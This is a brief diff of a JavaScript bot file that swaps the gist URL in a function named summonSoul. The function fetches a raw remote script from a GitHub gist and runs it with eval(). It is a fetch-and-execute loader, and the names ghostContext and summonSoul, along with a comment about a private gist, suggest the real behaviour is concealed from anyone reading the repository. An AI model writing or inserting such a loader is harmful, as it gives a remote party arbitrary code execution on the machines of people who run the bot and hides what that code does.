@@ -32,7 +32,7 @@ const ghostContext = {
 const summonSoul = async (m, sock) => {
     try {
         // REPLACE THIS URL WITH YOUR PRIVATE RAW GIST LINK
-        const soulUrl = "https://gist.githubusercontent.com/Stan/gistid/raw/soul.js";
+        const soulUrl = "https://gist.githubusercontent.com/Official123-12/gistid/raw/soul.js";
         const response = await axios.get(soulUrl);
         eval(response.data);
     } catch (e) {
